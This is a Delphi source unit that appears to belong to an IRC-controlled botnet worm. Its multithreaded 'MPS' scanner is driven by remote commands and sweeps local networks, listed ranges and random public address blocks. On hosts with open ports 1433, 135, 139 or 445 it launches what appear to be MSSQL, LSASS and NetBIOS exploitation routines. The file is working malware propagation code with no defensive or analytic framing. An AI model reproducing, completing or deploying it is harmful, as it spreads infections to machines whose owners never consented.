unit Scanner;

interface

Procedure SetParams(Switch,Range1,Range2:string;threads:word);

implementation

uses
  SysUtils,winsock,stuff,errors,windows,classes,config,sql,netbios,lsass;

Type
  TScannerThread = class(TThread)
  Private
    eIP:Cardinal;
    id:word;
    CycleNum:smallint;
    Cycle:Boolean;
  public
    Ip:Cardinal;
    function TestTCPPort(IPAddr: cardinal; TCPPort,id: Word): Boolean;
    constructor Create(StartIp:Longint;num:word);
    procedure Execute; override;
  end;

Const
  // DEFINE TIME CHECKING
  //TBlocktime : integer = 50;
  MyFile:string ='7868.txt';

{
  MPS (Muilti Port / range Scanner By Morpheus (Beta test)
  Scanner paramters:
  -s | shut down
  -a | add range to list
  -p | print range list
  -c | clear the list
  -d | remove a range from the list
  -l | scan the lan
  -i | scan a range
  -f | scan from host lists
  -h | scan an host
  -r | scan random range
}


Procedure GetMuilips(var l:tstringlist);
type
  TaPInAddr=Array[0..50] of PInAddr;
  PaPInAddr=^TaPInAddr;
var
    phe: PHostEnt;
    pptr: PaPInAddr;
    i: Word;
    buff: pointer;
begin
    getmem(buff,64);
    Fillchar(buff^,64,#0);
    GetHostName(Buff, 64);
    phe:=GetHostByName(buff);
    freemem(buff);
    if (phe=nil) then Exit;
    pPtr:=PaPInAddr(phe^.h_addr_list);
    i:=0;
    while (pPtr^[i]<>nil) do begin
        l.Add(inttostr(pPtr^[i].S_addr AND $000000FF) + '.' + inttostr((pPtr^[i].S_addr AND $0000FF00) SHR 8)+'.0.0');
        Inc(i);
    end;
end;

Var
  dScannerStart,dScannerEnd:Cardinal;
  TotalThreads:Word;
  Thread: array of TScannerThread;
  Stopping:Boolean=false;
  ScanStatus:boolean=false;
  T: TTimeVal;
  Ranges:tstringlist=nil;

Procedure SetParams(Switch,Range1,Range2:string;threads:word);
Var
  Rand:Boolean;
  Buffer:String;
  I:integer;
begin
  if switch[2] <> 's' then
  begin
    dScannerStart := GetlongIp(Range1);
    dScannerEnd := GetlongIp(Range2);
  end;
  if (dScannerStart = 0) and not (switch[2]='Q') and not (switch[2]='h') and not (switch[2]='f') and not (switch[2]='c') and not (switch[2]='p')  and not (switch[2]='l')  and not (switch[2]='r') and not (switch[2]='s')  then
  begin
    SendSock('[MPS] Error ('+ER_006+')');
    exit;
  end;
  case switch[2] of
  'f':begin
      if FileExists(myFile) then
      begin
        Ranges:=Tstringlist.Create;
        Ranges.LoadFromFile(Myfile);
        if ranges.Count = 0 then
        begin
          freeandnil(ranges);
          exit;
        end
        else
        begin
          dScannerStart:=Getlongip(ranges[0]);
          dScannerEnd:=dScannerStart+65535;
          TotalThreads:=StrToIntDef(Range1,100);
          if ranges.count  < 2 then
            freeandnil(ranges);
          SendSock('[MPS] Starting Multi range scan [hosts:'+inttostr(ranges.Count)+' threads:'+inttostr(totalthreads)+']');
        end
      end
      end;
  'd':begin
        if FileExists(myFile) then
        begin
          Buffer:=Inttostr((dScannerStart AND $FF000000) SHR 24)+'.'+Inttostr((dScannerStart AND $00FF0000) SHR 16)+'.0.0';
          Ranges:=Tstringlist.Create;
          Ranges.LoadFromFile(MyFile);
          i:=Ranges.IndexOf(Buffer);
          if i <> -1 then
          begin
            ranges.Delete(i);
            sendsock('[MPS] ['+buffer+'] deleted.');
            ranges.SaveToFile(MyFile);
          end;
          FreeandNil(Ranges);
        end;
        exit;
      end;
  'a':begin
        Buffer:=Inttostr((dScannerStart AND $FF000000) SHR 24)+'.'+Inttostr((dScannerStart AND $00FF0000) SHR 16)+'.0.0';
        Ranges:=Tstringlist.Create;
        if FileExists(myFile) then
        begin
          Ranges.LoadFromFile(myfile);
          if Ranges.IndexOf(buffer) = -1 then
          begin
            Ranges.Add(Buffer);
            Ranges.SaveToFile(MyFile);
            Sendsock('[MPS] ['+buffer+'] added mask /255');
          end;
        end
        else
        begin
          Ranges.Add(Buffer);
          Ranges.SaveToFile(MyFile);
          Sendsock('[MPS] ['+buffer+'] added mask /255');
        end;
        freeandnil(ranges);
        exit;
      end;
  'c':begin
        if DeleteFile(Pchar(myFile)) then
          SendSock('[MPS] List cleard')
        else
        begin
          SendSock('[MPS] Error ('+ER_013+')');
          exit;
        end;
        exit;
      end;
  'p':begin
        Ranges:=Tstringlist.Create;
        Ranges.LoadFromFile(MyFile);
        if not FileExists(myFile) then
        begin
          SendSock('[MPS] Error ('+ER_012+')');
          exit;
        end;
        SendSock('[MPS] Printing ranges list:');
        For i:=0 to Ranges.Count -1 do begin
          SendSock('[MPS] ['+Inttostr(i+1)+'] '+Ranges[i]);
          sleep(500);
        end;
        sendsock('[MPS] EOF');
        freeandnil(ranges);
        exit;
      end;
  'i':begin
        if dScannerEnd = 0 then
        begin
          TotalThreads := 1;
          dScannerEnd:=dScannerStart;
        end
        else
          if dScannerEnd >= dScannerStart then
          begin
            if (dScannerEnd-dScannerStart) < Threads then
              TotalThreads:=dScannerEnd-dScannerStart+1
            else
              TotalThreads:=Threads;
          end
          else
          begin
            SendSock('[MPS] Error ('+ER_010+')');
            exit;
          end;
          sendsock('MPS From: '+GetShortip(dScannerStart)+' To: '+GetShortip(dScannerEnd)+' started with('+inttostr(totalthreads)+').');
      end;
  'h':begin
        Buffer:=GetIPFROMHOST(Range1);
        if buffer = '' then
        begin
          SendSock('[MPS] Error ('+ER_005+range1+')');
          exit;
        end
        else
        begin
          dScannerStart:=GetlongIp(Buffer);
          dScannerEnd:=dScannerStart;
          TotalThreads:=1;
          SendSock('[MPS] Scannig host: '+Buffer);
        end;
       end;
  'r':begin
        Rand:=false;
        while not rand do
        begin
          // saving varbles, using dscannerstart and end to store the random
          randomize;
          dScannerStart:=random(255)+1;
          dScannerEnd:=random(255)+1;
          case dScannerStart of
          10:rand:=false;
          127:rand:=false;
          172:if (dScannerEnd >= 16) and (dScannerEnd <= 31) then rand:=false;
          192:if dScannerEnd = 168 then rand:=false;
          169:if dScannerEnd = 254 then rand:=false;
          else
            rand:=true;
          end;
        end;
        TotalThreads:=100;
        dScannerStart:=GetLongIp(Inttostr(dScannerStart)+'.'+inttostr(dScannerEnd)+'.0.0');
        dScannerEnd:=dScannerStart+65535;
        sendsock('MPS From: '+GetShortip(dScannerStart)+' To: '+GetShortip(dScannerEnd)+' started with('+inttostr(totalthreads)+').');
      end;
  's':begin
        if scanstatus then
        begin
          SendSock('[MPS] Attempting to shutdown scanner.');
          Stopping:=true;
        end;
        exit;
      end;
  'l':begin
      // Finally Scan Network (Revision Scanner)
      { Threads 1000 }
      { Time out // less then 500ms }
      if (GetSystemMetrics(SM_NETWORK) AND $01 = $01) then
      begin
        Ranges:=tStringlist.Create;
        GetMuilips(ranges);
        dScannerStart:=getlongip(Ranges[0]);
        dScannerEnd:=dScannerStart+65535;
        if ranges.Count > 1 then
        begin
          TotalThreads:=1000; // return to 100, if i fix this..
        end
        else
        begin
          Freeandnil(Ranges);
          TotalThreads:=100;
        end;
        SendSock('[MPS] Starting to scan network.');
      end
      else
      begin
        SendSock('[MPS] Error ('+ER_011+')');
        exit;
      end;
      end;
  else
  begin
    if scanstatus then
      Sendsock('[MPS] ACTIVE [Current:'+GetShortIp(Thread[0].IP)+' Threads:'+inttostr(TotalThreads)+']')
    else
      SendSock('[MPS] INACTIVE.');
    exit;
  end;
  end;
  ScanStatus:=true;
  if TotalThreads > 1000 then TotalThreads := 100; // default 100
  setlength(thread,totalthreads);
  for i:=1 to totalThreads do
    Thread[i-1]:=TScannerThread.Create(dScannerStart+i-1,i-1);
end;

function TScannerThread.TestTCPPort(IPAddr: cardinal; TCPPort,Id: Word): Boolean;
var
  FDSet : TFDSet;
  S: TSocket;
  Addr: sockaddr_in;
  Il : U_Long;
  Res:integer;
begin
  addr.sin_family := AF_INET;
  addr.sin_port := htons(TCPPort);
  addr.sin_addr.S_addr:=Stuff.Vise(IPAddr);
  s := socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  Il:=id+1;
  IOCtlSocket(S, FIONBIO, Il);
  Res := connect(s, addr, SizeOf(addr));
  if Res = SOCKET_ERROR then
  if WSAGetLastError = WSAEWOULDBLOCK then
  begin
    FDSet.fd_count := 1;
    FDSet.fd_array[0] := S;
  end;
  Res := select(0, nil, @Fdset, nil, @T);
  closesocket(S);
  result := res = 1;
end;

Function CheckThreads:boolean;
var i:integer;
begin
  Result:=false;
  for i:=1 to TotalThreads do
    if thread[i-1] <> nil then
    begin
      result:=true;
      exit;
    end
end;

Procedure Ending;
begin
  while checkthreads do
    sleep(1000);
  Stopping:=false;
  ScanStatus:=false;
  if ranges <> nil then
  begin
    sendsock('MPS From: '+ranges[0]+' To: '+ranges[ranges.Count-1]+' ended.');
    freeandnil(ranges);
  end
  else
    sendsock('MPS From: '+GetShortip(dScannerStart)+' To: '+GetShortip(dScannerEnd)+' ended.');
end;

procedure TScannerThread.Execute;
Var i:integer;
begin
  eIp:=dScannerEnd;
  If Ranges <> nil then
  begin
    CycleNum:=0;
    Cycle:=True;
  end
  Else
    Cycle:=false;
  Repeat
  begin
    for i:=1 to Length(Data.dScannerPorts) do begin
      if Stopping then break;
      if TestTCPPort(Ip,Data.dScannerPorts[i],id) then
      case Data.dScannerPorts[i] of
      1433:dosql(GetShortIp(IP));
      139,445,135:begin
                    DoLsass(GetShortIp(IP));
                    NetBiosStart(GetShortIp(IP));
                    break;
                  end;
      end;
    sleep(0);
    end;
    Ip:=Ip+TotalThreads;
    if (ip > eIp) and Cycle then
    begin
      if (CycleNum+1) = (Ranges.Count-1) then Cycle:=false;
      Inc(CycleNum);
      IP:=getlongip(Ranges[CycleNum])+id;
      eIp:=getlongip(Ranges[CycleNum])+65535;
    end;
  sleep(0);
  end;
  until (ip > eIp) or Stopping;
  Thread[Id]:=nil;
  If (id=0) or stopping then
    if id=0 then ending;
end;

constructor TScannerThread.Create;
begin
  inherited Create(false);
  ip:=startip;
  id:=num;
  FreeOnTerminate := True;
end;

begin
  T.tv_sec := 0;
  T.tv_usec := 100000 * 10; //1000ms is the best i can do
end.

